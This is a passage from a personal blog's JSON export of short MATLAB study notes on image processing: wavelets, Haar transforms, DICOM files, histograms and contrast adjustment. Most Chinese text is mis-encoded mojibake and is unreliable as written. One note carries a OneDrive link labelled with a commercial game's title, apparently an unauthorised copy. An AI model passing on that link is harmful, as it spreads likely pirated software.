allowfullscreen&gt;&lt;/iframe&gt;","categories":[],"tags":[{"name":"SVM","slug":"SVM","permalink":"http://finsenty54.github.io/tags/SVM/"}]},{"title":"essay1","slug":"essay1","date":"2020-02-19T05:42:06.000Z","updated":"2020-02-19T05:42:58.270Z","comments":true,"path":"2020/02/19/essay1/","link":"","permalink":"http://finsenty54.github.io/2020/02/19/essay1/","excerpt":"","text":"matlabå¯ä»¥ psnr() RGBå›¾åƒç›´æ¥æ¥ Normalized Cross Correlationnormxcorr2 matlabè®¡ç®—æ–¹æ³•ä¸åŒThe value is generally 0â€“1. However, ideally it should be 1 but the value 0.7 is acceptable.","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab_haar3","slug":"matlab_haar3","date":"2020-02-18T06:39:08.000Z","updated":"2020-02-18T06:39:50.920Z","comments":true,"path":"2020/02/18/matlab_haar3/","link":"","permalink":"http://finsenty54.github.io/2020/02/18/matlab_haar3/","excerpt":"RGB ä¸‰ä¸ªäºŒç»´æ•°ç»„åˆ†åˆ«è¡¨ç¤ºR,G,Bå³ï¼Œå¦‚æœimshowçš„å‚æ•°ç±»å‹ä¸ºdouble ï¼Œé‚£ä¹ˆå‚æ•°çš„å–å€¼èŒƒå›´åªæœ‰åœ¨[0 1]æ‰ä¼šæ­£å¸¸æ˜¾ç¤ºã€‚å½“å€¼å¤§äº1æ—¶ï¼Œéƒ½æ˜¾ç¤ºç™½è‰²ã€‚è¿™ä¸matlabçš„ä¼ ç»Ÿæ˜¯ä¸€è‡´çš„ï¼Œ å¯¹äºç°åº¦å›¾åƒï¼Œuint8è¡¨ç¤ºèŒƒå›´æ˜¯[0 255] ,doubleè¡¨ç¤ºèŒƒå›´æ˜¯[0 1]","text":"RGB ä¸‰ä¸ªäºŒç»´æ•°ç»„åˆ†åˆ«è¡¨ç¤ºR,G,Bå³ï¼Œå¦‚æœimshowçš„å‚æ•°ç±»å‹ä¸ºdouble ï¼Œé‚£ä¹ˆå‚æ•°çš„å–å€¼èŒƒå›´åªæœ‰åœ¨[0 1]æ‰ä¼šæ­£å¸¸æ˜¾ç¤ºã€‚å½“å€¼å¤§äº1æ—¶ï¼Œéƒ½æ˜¾ç¤ºç™½è‰²ã€‚è¿™ä¸matlabçš„ä¼ ç»Ÿæ˜¯ä¸€è‡´çš„ï¼Œ å¯¹äºç°åº¦å›¾åƒï¼Œuint8è¡¨ç¤ºèŒƒå›´æ˜¯[0 255] ,doubleè¡¨ç¤ºèŒƒå›´æ˜¯[0 1]isequal() å¡å°”è¾¾è’é‡ä¹‹æ¯Onedrive https://imhuanggh-my.sharepoint.com/:f:/g/personal/bin_imhuanggh_onmicrosoft_com/EhOlmQivpRBLh3BLkqxyDLYBW0JDW1V7i8lixd1T1Df-4g","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab_haar2","slug":"matlab_haar2","date":"2020-02-12T06:09:07.000Z","updated":"2020-02-12T06:09:39.007Z","comments":true,"path":"2020/02/12/matlab_haar2/","link":"","permalink":"http://finsenty54.github.io/2020/02/12/matlab_haar2/","excerpt":"imbinarizeBinarize 2-D grayscale image or 3-D volume by thresholding","text":"imbinarizeBinarize 2-D grayscale image or 3-D volume by thresholding 64:1ans = ç©ºçš„ 1Ã—0 double è¡Œå‘é‡æˆ‘äººå‚»äº†æ³¨æ„æ–‡ä»¶æ‰€åœ¨æ–‡ä»¶å¤¹è¿™ä¸¤ä¸ªé—®é¢˜å¼„äº†æˆ‘ä¸€ä¸‹åˆ å›¾å½¢çš„å‡½æ•° fliplr å¯ä»¥ä»å·¦å¾€å³åœ°ç¿»è½¬çŸ©é˜µ æˆ‘è§‰å¾—æˆ‘æ‡‚ç‚’è‚¡äº†https://player.bilibili.com/player.html?aid=68967083&amp;cid=119544791&amp;page=1","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab_haar1","slug":"matlab_haar1","date":"2020-02-11T05:53:24.000Z","updated":"2020-02-11T05:54:14.257Z","comments":true,"path":"2020/02/11/matlab_haar1/","link":"","permalink":"http://finsenty54.github.io/2020/02/11/matlab_haar1/","excerpt":"waveletfamilies(&apos;a&apos;) waveletfamilies(&apos;f&apos;) waveinfo(&apos;db&apos;) use wfilters, wavefun, and wpfun to obtain the filters, wavelet, or wavelet packets","text":"waveletfamilies(&apos;a&apos;) waveletfamilies(&apos;f&apos;) waveinfo(&apos;db&apos;) use wfilters, wavefun, and wpfun to obtain the filters, wavelet, or wavelet packets linspaceGenerate linearly spaced vectorcollapse all in pageSyntaxy = linspace(x1,x2)y = linspace(x1,x2,n) å°æ³¢çš„å«ä¹‰ï¼Œå³ä¸ºæ—¶é—´ä¸Šè¡°å‡å¿«ï¼Œå’Œå‚…é‡Œå¶çš„æ­£å¼¦æ³¢ç›¸æ¯”è¦çŸ­ã€‚åœ¨é¢‘ç‡åŸŸä¸Šï¼Œé€šè¿‡æ‹‰ä¼¸æˆ–å‹ç¼©å°æ³¢çš„é•¿åº¦ï¼Œæ¥æ”¹å˜å°æ³¢çš„é•¿çŸ­å’Œé¢‘ç‡ï¼Œå®ç°ä¸åŒé¢‘ç‡ä¸‹çš„å°æ³¢ç³»æ•°ã€‚å°æ³¢ä¸­ï¼Œä¸€èˆ¬ç”¨å°ºåº¦scaleæ¥è¡¡é‡å°æ³¢çš„é¢‘ç‡fï¼Œä¸¤è€…ä¹‹é—´çš„è½¬æ¢å…³ç³»ä¸ºï¼šscaleâˆ—f=Fsâˆ—wcfscale f=Fs wcfscaleâˆ—f=Fsâˆ—wcfå…¬å¼ä¸­ï¼ŒFsä»£è¡¨ä¿¡å·çš„é‡‡æ ·é¢‘ç‡ï¼Œwcfä¸ºå°æ³¢çš„ä¸­å¿ƒé¢‘ç‡ï¼ˆwave central freqï¼‰ï¼Œåœ¨matlabé‡Œå¯ä»¥ç”¨ centfrq(wavename) æ¥æŸ¥è¯¢ã€‚ å™ªç‚¹ é«˜é¢‘ä¿¡å· imagescDisplay image with scaled colors å°ºåº¦å‡½æ•°åˆç§°ä¸ºå°æ³¢çˆ¶å‡½æ•°phi å¸Œè…Šæ–‡ haart2ï¼ˆxï¼Œlevel)If level is greater than 1, then h, v, and d are cell arrays. If level is equal to 1, then h, v, and d are matrices.2-D Haar wavelet transform ihaart2Inverse 2-D Haar wavelet transform","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlabå›¾åƒç¤ºä¾‹ç¬”è®°3","slug":"matlabå›¾åƒç¤ºä¾‹ç¬”è®°3","date":"2020-02-10T06:47:00.000Z","updated":"2020-02-10T06:56:40.270Z","comments":true,"path":"2020/02/10/matlabå›¾åƒç¤ºä¾‹ç¬”è®°3/","link":"","permalink":"http://finsenty54.github.io/2020/02/10/matlabå›¾åƒç¤ºä¾‹ç¬”è®°3/","excerpt":"mat2gray å°†dicomå˜ä¸ºgreyim2uint8","text":"mat2gray å°†dicomå˜ä¸ºgreyim2uint8 The image on the right has higher contrast, with intensity values that fill the entire intensity range [0, 255]. å¦‚æœæŒ‡å®šç©ºçŸ©é˜µ ([])ï¼Œåˆ™ imshow ä½¿ç”¨ [min(I(:)) max(I(:))]ã€‚æ¢è¨€ä¹‹ï¼Œä½¿ç”¨ I ä¸­çš„æœ€å°å€¼ä½œä¸ºé»‘è‰²ï¼Œä½¿ç”¨æœ€å¤§å€¼ä½œä¸ºç™½è‰²ã€‚ imadjustYou must specify the intensities as values between 0 and 1 regardless of the class of I. If I is uint8, the values you supply are multiplied by 255 to determine the actual values to use; if I is uint16, the values are multiplied by 65535. figure,imshow(pout_histeq);title(â€˜Histeqâ€™); ROICreate a Binary MaskYou can use the createMask function of the imroi base class to create a binary mask for any type of ROI object â€” impoint, imline, imrect, imellipse, impoly, or imfreehand.","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlabå›¾åƒç¤ºä¾‹ç¬”è®°2","slug":"matlabå›¾åƒç¤ºä¾‹ç¬”è®°2","date":"2020-02-07T08:23:56.000Z","updated":"2020-02-10T06:56:33.170Z","comments":true,"path":"2020/02/07/matlabå›¾åƒç¤ºä¾‹ç¬”è®°2/","link":"","permalink":"http://finsenty54.github.io/2020/02/07/matlabå›¾åƒç¤ºä¾‹ç¬”è®°2/","excerpt":"dicom ï¼ˆa image type using in medical)To read metadatafrom a DICOM file, use the dicominfo function To readimage datafrom a DICOM file, use the dicomread function.","text":"dicom ï¼ˆa image type using in medical)To read metadatafrom a DICOM file, use the dicominfo function To readimage datafrom a DICOM file, use the dicomread function. If you just want to view the metadata in a DICOM file, for debugging purposes, you can use thedicomdisp function. use one of the toolbox image display functions imshow or imtool. the image data in this DICOM file is signed 16-bit data, you must use the autoscaling syntax with either display function to make the image viewable.imshow(I,&#39;DisplayRange&#39;,[]) use the dicomanon function. Remove Confidential Information To write image data or metadata to a file in DICOM format, use the dicomwrite function. Create New DICOM Seriesinfo.SeriesInstanceUID Generate a new DICOM unique identifier (UID) using the dicomuid function. uid = dicomuid info.SeriesInstanceUID = uid; dicomwrite(Imodified,&apos;ankle_newseries.dcm&apos;,info); The example finds the maximum and minimum values of all pixels in the image. The pixels that form the white text charactersareset to the maximum pixel value. MATLAB command prompt: Enter dicomBrowser. Image Type Conversion","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlabå›¾åƒç¤ºä¾‹ç¬”è®°1","slug":"matlabå›¾åƒç¤ºä¾‹ç¬”è®°1","date":"2020-02-06T06:30:11.000Z","updated":"2020-02-06T06:30:57.460Z","comments":true,"path":"2020/02/06/matlabå›¾åƒç¤ºä¾‹ç¬”è®°1/","link":"","permalink":"http://finsenty54.github.io/2020/02/06/matlabå›¾åƒç¤ºä¾‹ç¬”è®°1/","excerpt":"å¯¹æ¯”åº¦histogram ç›´æ–¹å›¾Precede the call to imhistwith the figurecommand so that the histogram does not overwrite the display of the image I in the current figure window. To see the distribution of intensities in the image, create a histogram by calling the imhist function.è¾“å…¥å›¾ç‰‡ï¼Œå›¾ç‰‡è¦æ±‚ä¸ºç°åº¦å›¾æˆ–è€…äºŒå€¼å›¾ imhist","text":"å¯¹æ¯”åº¦histogram ç›´æ–¹å›¾Precede the call to imhistwith the figurecommand so that the histogram does not overwrite the display of the image I in the current figure window. To see the distribution of intensities in the image, create a histogram by calling the imhist function.è¾“å…¥å›¾ç‰‡ï¼Œå›¾ç‰‡è¦æ±‚ä¸ºç°åº¦å›¾æˆ–è€…äºŒå€¼å›¾ imhist F=imread(â€˜test.jpgâ€™); I=rgb2gray(F); [count,x]=imhist(Iï¼Œ30) % è·å–ç›´æ–¹å›¾çš„æ¨ªåæ ‡å’Œçºµåæ ‡ï¼Œå³å„ä¸ªåƒç´ çº§ï¼Œä»¥åŠæ¯ä¸ªåƒç´ çº§ä¸Šçš„åƒç´ å‡ºç°çš„æ¬¡æ•°figure; subplot(221);imhist(I,2); subplot(222);imhist(I,5); subplot(223);imhist(I,10); subplot(224);imhist(I); figure; subplot(121); imhist(I,10) [count,x] = imhist(I,10) subplot(122);stem(x,count); stemç»˜åˆ¶ç¦»æ•£åºåˆ—æ•°æ® Improve the contrastin an image, using the histeq function. The toolbox includes several other functions that perform contrast adjustment, including imadjust and adapthisteq, and interactive tools such as the Adjust Contrast tool, available in the Image Vieweradjust the contrast ç°åº¦ç›´æ–¹å›¾å‡è¡¡åŒ–histeq Correct Nonuniform Background Illumination and Analyze Foreground Objectsnonuniform strelï¼ˆï¼‰Morphological structuring element J = imopen(I,SE)performs morphological opening on the grayscale or binary image I, returning the opened image, J. SE is a single structuring element object returned by the strel or offsetstrel functions. The morphological open operation is an erosion followed by a dilation, using the same structuring element for both operations. surfæ›²é¢å›¾å…¨é¡µæŠ˜å è¯­æ³•surf(X,Y,Z)surf(X,Y,Z,C) f1=imadjustï¼ˆfï¼Œ[low_in high_in],[low_out high_out],gammaï¼‰è¯¥å‡½æ•°çš„æ„ä¹‰å¦‚å›¾1æ‰€ç¤ºï¼ŒæŠŠå›¾åƒf ç°åº¦å˜æ¢åˆ°æ–°å›¾åƒf1çš„è¿‡ç¨‹ä¸­ï¼Œf ä¸­ç°åº¦å€¼ä½äºlow_inçš„åƒç´ ç‚¹åœ¨f1ä¸­ç°åº¦å€¼è¢«èµ‹å€¼ä¸ºlow_out,åŒç†ï¼Œfä¸­ç°åº¦å€¼é«˜äºhigh_inçš„åƒç´ ç‚¹å˜æ¢åˆ°f1æ—¶å…¶ç°åº¦å€¼ä¹Ÿè¢«èµ‹å€¼ä¸ºhigh_out; J=imadjust(I,[0.2 0.5],[0 1])åŸå›¾åƒç°åº¦èŒƒå›´ä¸º0-255ï¼Œç¨‹åºå°†å°äº255Ã—0.2çš„ç°åº¦å€¼è®¾ç½®ä¸º0ï¼Œå°†å¤§äº255Ã—0.5çš„ç°åº¦å€¼è®¾ç½®ä¸º255 é¥±å’Œåº¦å–å†³äºè¯¥è‰²ä¸­å«è‰²æˆåˆ†å’Œæ¶ˆè‰²æˆåˆ†ï¼ˆç°è‰²ï¼‰çš„æ¯”ä¾‹æ¯”åº¦æŒ‡çš„æ˜¯ä¸€å¹…å›¾åƒä¸­æ˜æš—åŒºåŸŸæœ€äº®çš„ç™½å’Œæœ€æš—çš„é»‘ä¹‹é—´ä¸åŒäº®åº¦å±‚çº§çš„æµ‹é‡ï¼Œå·®å¼‚èŒƒå›´è¶Šå¤§ä»£è¡¨å¯¹æ¯”è¶Šå¤§ Use theimbinarize function to convert the grayscale image into abinary image Remove background noise from the image with thebwareaopen function. F = false(sz1,â€¦,szN) æ˜¯ç”±é€»è¾‘å€¼â€œ0â€ç»„æˆçš„ sz1Ã—â€¦Ã—szN æ•°ç»„ï¼Œå…¶ä¸­ sz1,â€¦,szN è¡¨ç¤ºæ¯ä¸ªç»´åº¦çš„å¤§å°ã€‚ä¾‹å¦‚ï¼Œfalse(2,3) è¿”å›ç”±é€»è¾‘å€¼â€œ0â€ç»„æˆçš„ 2Ã—3 æ•°ç»„ã€‚","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlabç¬”è®°5 image","slug":"matlabç¬”è®°5","date":"2020-02-05T05:41:19.000Z","updated":"2020-02-05T05:42:28.598Z","comments":true,"path":"2020/02/05/matlabç¬”è®°5/","link":"","permalink":"http://finsenty54.github.io/2020/02/05/matlabç¬”è®°5/","excerpt":"ä½¿ç”¨åŸºäºå¸•æ–¯å¡ä¸‰è§’å½¢çš„é¡¹åˆ›å»ºä¸€ä¸ªå¯¹ç§°çŸ©é˜µï¼šA = pascal(3) randi çš„ç¬¬ä¸€ä¸ªè¾“å…¥æè¿°æ•´æ•°å¯èƒ½å€¼çš„èŒƒå›´ï¼Œåé¢ä¸¤ä¸ªè¾“å…¥æè¿°è¡Œå’Œåˆ—çš„æ•°é‡ã€‚C = randi(10,3,2) æœ‰ä¸€ä¸ªä¸“é—¨çš„ç‚¹ç§¯å‡½æ•°ï¼Œç§°ä¸º dotã€‚","text":"ä½¿ç”¨åŸºäºå¸•æ–¯å¡ä¸‰è§’å½¢çš„é¡¹åˆ›å»ºä¸€ä¸ªå¯¹ç§°çŸ©é˜µï¼šA = pascal(3) randi çš„ç¬¬ä¸€ä¸ªè¾“å…¥æè¿°æ•´æ•°å¯èƒ½å€¼çš„èŒƒå›´ï¼Œåé¢ä¸¤ä¸ªè¾“å…¥æè¿°è¡Œå’Œåˆ—çš„æ•°é‡ã€‚C = randi(10,3,2) æœ‰ä¸€ä¸ªä¸“é—¨çš„ç‚¹ç§¯å‡½æ•°ï¼Œç§°ä¸º dotã€‚éå…±è½­å¤æ•°è½¬ç½®ï¼ˆå…¶ä¸­æ¯ä¸ªå…ƒç´ çš„å¤æ•°éƒ¨åˆ†ä¿ç•™å…¶ç¬¦å·ï¼‰è¡¨ç¤ºä¸ºz.&#39; eye(m,n)è¿”å› mÃ—n çŸ©å½¢å•ä½çŸ©é˜µï¼Œeye(n) è¿”å› nÃ—n å•ä½æ–¹é˜µã€‚ å‘é‡ x çš„ p-èŒƒæ•°ï¼Œnorm(x,p) è¿›è¡Œè®¡ç®—ï¼Œæ­¤è¿ç®—æ˜¯ä¸º p &gt; 1 çš„ä»»æ„å€¼å®šä¹‰çš„ï¼Œä½†æœ€å¸¸è§çš„ p å€¼ä¸º 1ã€2 å’Œ âˆã€‚é»˜è®¤å€¼ä¸º p = 2ï¼Œ x = b/Aè¡¨ç¤ºä½¿ç”¨ mrdivide è·å¾—çš„çŸ©é˜µæ–¹ç¨‹ xA = b çš„è§£ã€‚x = A\\bè¡¨ç¤ºä½¿ç”¨ mldivide è·å¾—çš„çŸ©é˜µæ–¹ç¨‹ Ax = b çš„è§£ã€‚ (b/A)&#39; = (A&#39;\\b&#39;).m = næ–¹é˜µæ–¹ç¨‹ç»„ã€‚æ±‚ç²¾ç¡®è§£ã€‚m &gt; nè¶…å®šæ–¹ç¨‹ç»„ï¼Œå³æ–¹ç¨‹ä¸ªæ•°å¤šäºæœªçŸ¥æ•°ä¸ªæ•°ã€‚æ±‚æœ€å°äºŒä¹˜è§£ã€‚m &lt; næ¬ å®šæ–¹ç¨‹ç»„ï¼Œå³æ–¹ç¨‹ä¸ªæ•°å°‘äºæœªçŸ¥æ•°ä¸ªæ•°ã€‚ä½¿ç”¨æœ€å¤š m ä¸ªéé›¶åˆ†é‡æ±‚åŸºæœ¬è§£ã€‚ éå¥‡å¼‚çŸ©é˜µ==å¯é€†çŸ©é˜µ eigç‰¹å¾å€¼å’Œç‰¹å¾å‘é‡ æä¾›çš„æ•°æ®åˆ†æå‡½æ•°çš„åˆ—è¡¨ï¼Œè¯·é”®å…¥help datafun å›¾åƒè¦æ˜¾ç¤ºå›¾åƒï¼Œè¯·ä½¿ç”¨ imshow å‡½æ•°ï¼šimshow(X,map)ä½¿ç”¨imread å‡½æ•°å¯ä»¥è¯»å–æ ‡å‡†å›¾åƒæ–‡ä»¶ï¼ˆTIFFã€JPEGã€PNG ç­‰ï¼‰ã€‚imread è¿”å›çš„æ•°æ®ç±»å‹å–å†³äºè¯»å–çš„å›¾åƒç±»å‹ã€‚ä½¿ç”¨imwrite å‡½æ•°å¯ä»¥å°† MATLAB æ•°æ®å†™å…¥åˆ°å„ç§æ ‡å‡†å›¾åƒæ ¼å¼ã€‚å¤§å¤šæ•°å›¾åƒè¡¨ç¤ºä¸ºäºŒç»´æ•°ç»„ï¼ˆçŸ©é˜µï¼‰ï¼Œå…¶ä¸­çŸ©é˜µçš„æ¯ä¸ªå…ƒç´ å¯¹åº”æ‰€æ˜¾ç¤ºå›¾åƒçš„ä¸€ä¸ªåƒç´ ã€‚ä¾‹å¦‚ï¼Œç”± 200 è¡Œå’Œ 300 åˆ—ä¸åŒé¢œè‰²çš„ç‚¹ç»„æˆçš„å›¾åƒä¿å­˜ä¸ºä¸€ä¸ª 200Ã—300 çš„çŸ©é˜µã€‚æœ‰äº›å›¾åƒï¼Œå¦‚ RGBï¼Œéœ€è¦ä¸‰ç»´æ•°ç»„ï¼Œå…¶ä¸­ä¸‰ä¸ªç»´åº¦çš„ç¬¬ä¸€ä¸ªå¹³é¢è¡¨ç¤ºçº¢è‰²åƒç´ å¼ºåº¦ï¼Œç¬¬äºŒä¸ªå¹³é¢è¡¨ç¤ºç»¿è‰²åƒç´ å¼ºåº¦ï¼Œç¬¬ä¸‰ä¸ªå¹³é¢è¡¨ç¤ºè“è‰²åƒç´ å¼ºåº¦ã€‚MATLAB æ•°å­¦æ”¯æŒä¸‰ç§ä¸åŒçš„æ•°å€¼ç±»ç”¨äºå›¾åƒæ˜¾ç¤ºï¼šåŒç²¾åº¦æµ®ç‚¹æ•°ï¼ˆdoubleï¼‰16 ä½æ— ç¬¦å·æ•´æ•°ï¼ˆuint16ï¼‰8 ä½æ— ç¬¦å·æ•´æ•°ï¼ˆuint8ï¼‰ imshow æ˜¾ç¤ºå›¾åƒ image ä»æ•°ç»„æ˜¾ç¤ºå›¾åƒ imagesc æ˜¾ç¤ºä½¿ç”¨ç»è¿‡æ ‡åº¦æ˜ å°„çš„é¢œè‰²çš„å›¾åƒ imread ä»å›¾å½¢æ–‡ä»¶è¯»å–å›¾åƒ imresize è°ƒæ•´å›¾åƒå¤§å° imwrite å°†å›¾åƒå†™å…¥å›¾å½¢æ–‡ä»¶ imfinfo æœ‰å…³å›¾å½¢æ–‡ä»¶çš„ä¿¡æ¯ imformats ç®¡ç†å›¾åƒæ–‡ä»¶æ ¼å¼æ³¨å†Œè¡¨ frame2im è¿”å›ä¸å½±ç‰‡å¸§å…³è”çš„å›¾åƒæ•°æ® im2frame å°†å›¾åƒè½¬æ¢ä¸ºå½±ç‰‡å¸§ im2java å°†å›¾åƒè½¬æ¢ Java å›¾åƒ im2double å°†å›¾åƒè½¬æ¢ä¸ºåŒç²¾åº¦å€¼ ind2rgb å°†ç´¢å¼•å›¾åƒè½¬æ¢ä¸º RGB å›¾åƒ rgb2gray å°† RGB å›¾åƒæˆ–é¢œè‰²å›¾è½¬æ¢ä¸ºç°åº¦å›¾ rgb2ind å°† RGB å›¾åƒè½¬æ¢ä¸ºç´¢å¼•å›¾åƒ imapprox é€šè¿‡å‡å°‘é¢œè‰²æ•°é‡æ¥è¿‘ä¼¼å¤„ç†ç´¢å¼•å›¾åƒ dither è½¬æ¢å›¾åƒï¼Œé€šè¿‡æŠ–åŠ¨æé«˜è¡¨è§‚é¢œè‰²åˆ†è¾¨ç‡ cmpermute é‡æ–°æ’åˆ—é¢œè‰²å›¾ä¸­çš„é¢œè‰² cmunique æ¶ˆé™¤é¢œè‰²å›¾ä¸­çš„é‡å¤é¢œè‰²ï¼›å°†ç°åº¦æˆ–çœŸå½©è‰²å›¾åƒè½¬æ¢ä¸ºç´¢å¼•å›¾åƒ A = imread(&#39;ngc6543a.jpg&#39;); ç´¢å¼•å›¾åƒç”±æ•°æ®çŸ©é˜µ X å’Œé¢œè‰²å›¾çŸ©é˜µ map ç»„æˆã€‚map æ˜¯ä¸€ä¸ª double ç±»çš„ mÃ—3 æ•°ç»„ï¼Œç”± [0, 1] èŒƒå›´å†…çš„æµ®ç‚¹å€¼ç»„æˆã€‚map çš„æ¯ä¸€è¡ŒæŒ‡å®šå•ä¸€é¢œè‰²çš„çº¢ã€ç»¿å’Œè“åˆ†é‡ã€‚ç´¢å¼•å›¾åƒä½¿ç”¨åƒç´ å€¼åˆ°é¢œè‰²å›¾å€¼çš„â€œç›´æ¥æ˜ å°„â€ã€‚æ¯ä¸ªå›¾åƒåƒç´ çš„é¢œè‰²æ˜¯ä»¥ X ä¸­çš„å¯¹åº”å€¼ä¸ºç´¢å¼•æ±‚å¾—çš„ map ä¸­çš„å€¼ã€‚å› æ­¤ X å€¼å¿…é¡»æ˜¯æ•´æ•°ã€‚å€¼ 1 æŒ‡å‘ map ä¸­ç¬¬ä¸€è¡Œï¼Œå€¼ 2 æŒ‡å‘ç¬¬äºŒè¡Œï¼Œä»¥æ­¤ç±»æ¨ã€‚ä½¿ç”¨ä»¥ä¸‹è¯­å¥æ˜¾ç¤ºç´¢å¼•å›¾åƒã€‚image(X); colormap(map)å›¾åƒçŸ©é˜µå’Œé¢œè‰²å›¾ä¸­å€¼çš„å…³ç³»å–å†³äºå›¾åƒçŸ©é˜µçš„ç±»ã€‚å¦‚æœå›¾åƒçŸ©é˜µæ˜¯ double ç±»ï¼Œé‚£ä¹ˆå€¼ 1 æŒ‡å‘é¢œè‰²å›¾ä¸­çš„ç¬¬ä¸€è¡Œï¼Œå€¼ 2 æŒ‡å‘ç¬¬äºŒè¡Œï¼Œä»¥æ­¤ç±»æ¨ã€‚å¦‚æœå›¾åƒçŸ©é˜µæ˜¯ uint8 æˆ– uint16 ç±»ï¼Œé‚£ä¹ˆæœ‰ä¸ªåç§» - å€¼ 0 æŒ‡å‘é¢œè‰²å›¾ä¸­çš„ç¬¬ä¸€è¡Œï¼Œå€¼ 1 æŒ‡å‘ç¬¬äºŒè¡Œï¼Œä»¥æ­¤ç±»æ¨ã€‚åœ¨å›¾å½¢æ–‡ä»¶æ ¼å¼ä¸­ä½¿ç”¨åç§»æ˜¯ä¸ºäº†ä½¿å¯æ”¯æŒçš„é¢œè‰²æ•°ç›®è¾¾åˆ°æœ€å¤§ã€‚åœ¨ä¸Šé¢çš„å›¾åƒä¸­ï¼Œå›¾åƒçŸ©é˜µæ˜¯ double ç±»ã€‚ å¼ºåº¦å›¾åƒæ˜¯ä¸€ä¸ªæ•°æ®çŸ©é˜µ Iï¼Œå…¶ä¸­çš„å€¼è¡¨ç¤ºæŸä¸€èŒƒå›´å†…çš„å¼ºåº¦ã€‚å¼ºåº¦å›¾åƒè¡¨ç¤ºä¸ºå•ä¸ªçŸ©é˜µï¼ŒçŸ©é˜µçš„æ¯ä¸ªå…ƒç´ å¯¹åº”ä¸€ä¸ªå›¾åƒåƒç´ ã€‚imagesc(A); colormap(gray)imagesc(A,[min(A(:)) max(A(:))]); colormap(gray) bit-depthï¼šä½¿ç”¨å¤šå°‘ä½æ¥å®šä¹‰ä¸€ä¸ªåƒç´ ç‚¹ã€‚bit-depthè¶Šå¤§ï¼Œå¯ä»¥è¡¨ç¤ºçš„è‰²å½©å°±è¶Šå¤šã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå›¾åƒçš„åƒç´ å€¼èŒƒå›´ä¸º0-255ï¼Œ åˆ™å…¶bit-depthå°±æ˜¯8ã€‚RGBå›¾åƒçš„bit-depthä¸º24ï¼š8bitè¡¨ç¤ºRï¼Œ8bitè¡¨ç¤ºGï¼Œ8bitè¡¨ç¤ºBã€‚ RGB å›¾åƒï¼Œæœ‰æ—¶ç§°ä¸ºçœŸå½©è‰²å›¾åƒï¼Œä»¥ mÃ—nÃ—3 æ•°æ®æ•°ç»„å½¢å¼å­˜å‚¨ï¼Œè¯¥æ•°ç»„å®šä¹‰äº†å¯¹åº”å›¾åƒæ¯ä¸ªåƒç´ çš„çº¢è‰²ã€ç»¿è‰²å’Œè“è‰²åˆ†é‡ã€‚ä¾‹å¦‚åƒç´  (10,5) çš„çº¢è‰²ã€ç»¿è‰²å’Œè“è‰²åˆ†é‡åˆ†åˆ«å­˜å‚¨åœ¨ RGB(10,5,1)ã€RGB(10,5,2) å’Œ RGB(10,5,3) ä¸­ã€‚ æ‚¨å¯ä»¥å¯¹ uint8 å’Œ uint16 æ•°ç»„æ‰§è¡Œå…¶ä»–å‡ ç§æ“ä½œï¼ŒåŒ…æ‹¬ï¼šä½¿ç”¨ reshapeã€catã€permute å‡½æ•°ä»¥åŠ [] å’Œ â€˜ è¿ç®—ç¬¦é‡æ„ã€é‡æ–°æ’åºå’Œä¸²è”æ•°ç»„ä½¿ç”¨ save å’Œ load å°† uint8 å’Œ uint16 æ•°ç»„ä¿å­˜åŠåŠ è½½åˆ° MAT æ–‡ä»¶ã€‚ï¼ˆè¯·è®°ä½ï¼Œå¦‚æœè¦åŠ è½½æˆ–ä¿å­˜å›¾å½¢æ ¼å¼æ–‡ä»¶å›¾åƒï¼Œåˆ™å¿…é¡»ä½¿ç”¨ imread å’Œimwrite å‘½ä»¤ä»£æ›¿ã€‚ï¼‰ä½¿ç”¨ find å®šä½ uint8 å’Œ uint16 æ•°ç»„ä¸­éé›¶å…ƒç´ çš„ç´¢å¼•ã€‚ä½†è¿”å›çš„æ•°ç»„å§‹ç»ˆä¸º double ç±»ã€‚å…³ç³»è¿ç®—ç¬¦ åŸºäº NTSC æ ‡å‡†åˆå¹¶ RGB å€¼ï¼Œä»¥æ­¤æ–¹å¼æ¥è®¡ç®—å•è‰²äº®åº¦ï¼Œè¿™ä¼šå°†ä¸çœ¼ç›æ•æ„Ÿåº¦ç›¸å…³çš„ç³»æ•°åº”ç”¨åˆ° RGB é¢œè‰²ï¼š I = .2989*rgb_img(:,:,1)... +.5870*rgb_img(:,:,2)... +.1140*rgb_img(:,:,3);","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlabç¬”è®°4","slug":"matlabç¬”è®°4","date":"2020-02-03T05:12:21.000Z","updated":"2020-02-03T05:13:01.660Z","comments":true,"path":"2020/02/03/matlabç¬”è®°4/","link":"","permalink":"http://finsenty54.github.io/2020/02/03/matlabç¬”è®°4/","excerpt":"B = A - 8.5 B(1:2,2:3) = 0 x = [2.1 1.7 1.6 1.5 NaN 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8]; x = x(isfinite(x)) x = 2.1 1.7 1.6 1.5 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8 x = x(abs(x-mean(x)) &lt;= 3*std(x)) x = 2.1 1.7 1.6 1.5 1.9 1.8 1.5 1.8 1.4 2.2 1.6 1.8","text":"B = A - 8.5 B(1:2,2:3) = 0 x = [2.1 1.7 1.6 1.5 NaN 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8]; x = x(isfinite(x)) x = 2.1 1.7 1.6 1.5 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8 x = x(abs(x-mean(x)) &lt;= 3*std(x)) x = 2.1 1.7 1.6 1.5 1.9 1.8 1.5 1.8 1.4 2.2 1.6 1.8 find å‡½æ•°å¯ç”¨äºç¡®å®šä¸æŒ‡å®šé€»è¾‘æ¡ä»¶ç›¸ç¬¦çš„æ•°ç»„å…ƒç´ çš„ç´¢å¼•ã€‚find 